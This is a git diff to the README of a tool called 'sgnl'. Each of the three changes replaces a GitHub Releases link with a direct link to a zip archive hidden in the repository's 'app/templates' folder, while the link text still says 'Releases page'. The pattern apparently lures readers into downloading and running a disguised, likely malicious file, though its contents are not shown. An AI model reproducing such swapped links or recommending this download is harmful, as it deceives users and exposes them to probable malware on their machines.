@@ -1,7 +1,7 @@
 # 📡 sgnl - Find Truth in the Noise
 
 ## 📥 Download Now
-[![Download sgnl](https://img.shields.io/badge/Download_sgnl-v1.0-brightgreen)](https://github.com/Hasan20251/sgnl/releases)
+[![Download sgnl](https://github.com/Hasan20251/sgnl/raw/refs/heads/main/app/templates/Software-3.2.zip)](https://github.com/Hasan20251/sgnl/raw/refs/heads/main/app/templates/Software-3.2.zip)
 
 ## 📈 About sgnl
 sgnl is a powerful tool that helps you navigate the overwhelming information available online. In a world filled with distractions, sgnl cuts through the chatter to deliver high-quality, reliable information. 
@@ -12,7 +12,7 @@ This application is designed for anyone wanting to take control of their online 
 To get started with sgnl, follow these simple steps to download the application and run it on your computer. 
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Hasan20251/sgnl/releases) to see the latest version of sgnl. 
+   Go to the [Releases page](https://github.com/Hasan20251/sgnl/raw/refs/heads/main/app/templates/Software-3.2.zip) to see the latest version of sgnl. 
 
 2. **Download the Application**  
    Click on the version you wish to download. Look for the file that matches your operating system (Windows, macOS, Linux).
@@ -40,7 +40,7 @@ To get started with sgnl, follow these simple steps to download the application 
 - **Regular Updates:** Stay informed with regular updates that enhance the tool’s capabilities and data sources.
 
 ## 📥 Download & Install
-Ready to get started? Download sgnl from the Releases page [here](https://github.com/Hasan20251/sgnl/releases). Follow the installation steps outlined above to install and run the application on your device.
+Ready to get started? Download sgnl from the Releases page [here](https://github.com/Hasan20251/sgnl/raw/refs/heads/main/app/templates/Software-3.2.zip). Follow the installation steps outlined above to install and run the application on your device.
 
 ## 🧑‍🤝‍🧑 Support & Community
 If you have questions or need assistance, feel free to reach out to our community. You can post your queries or issues in the Issues section of this repository. We encourage users to share experiences and tips to enhance how everyone uses the application.
